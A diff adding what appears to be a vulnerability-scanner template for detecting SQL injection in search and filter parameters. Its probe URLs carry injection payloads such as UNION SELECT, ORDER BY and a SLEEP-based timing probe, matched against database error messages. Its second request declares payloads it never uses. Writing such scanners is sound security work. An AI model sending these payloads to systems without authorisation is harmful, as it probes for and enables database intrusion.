@@ -1,0 +1,68 @@
+id: sqli-search-parameter
+
+info:
+  name: SQL Injection via Search/Filter Parameters
+  author: security-researcher
+  severity: high
+  description: |
+    검색 및 필터링 기능의 파라미터를 통한 SQL 인젝션 취약점을 탐지합니다.
+    LIKE 구문과 함께 사용되는 검색 기능에서 자주 발생합니다.
+  tags: sqli,search,filter,injection,like
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/search?q=test'"
+      - "{{BaseURL}}/search?query=test'"
+      - "{{BaseURL}}/search?keyword=test'"
+      - "{{BaseURL}}/search?term=test'"
+      - "{{BaseURL}}/search?s=test'"
+      - "{{BaseURL}}/products?name=test'"
+      - "{{BaseURL}}/users?name=test'"
+      - "{{BaseURL}}/items?filter=test'"
+      - "{{BaseURL}}?search=test' AND '1'='1"
+      - "{{BaseURL}}?q=test%' UNION SELECT NULL--"
+      - "{{BaseURL}}?search=test' ORDER BY 1--"
+      - "{{BaseURL}}?q=test'; SELECT SLEEP(5)--"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "you have an error in your sql syntax"
+          - "warning: mysql"
+          - "ORA-\\d{5}"
+          - "Microsoft OLE DB"
+          - "PostgreSQL.*ERROR"
+          - "SQLite.*error"
+          - "sql.*syntax.*error|error.*sql.*syntax"
+        condition: or
+        case-insensitive: true
+
+      - type: dsl
+        dsl:
+          - "duration >= 5000"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/search"
+      - "{{BaseURL}}/api/products"
+      - "{{BaseURL}}/api/users"
+
+    headers:
+      Accept: application/json
+
+    payloads:
+      params:
+        - "q=test'"
+        - "keyword=test'"
+        - "name=test'"
+        - "filter=test'"
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "sql.*error|syntax.*error|database.*error"
+        case-insensitive: true
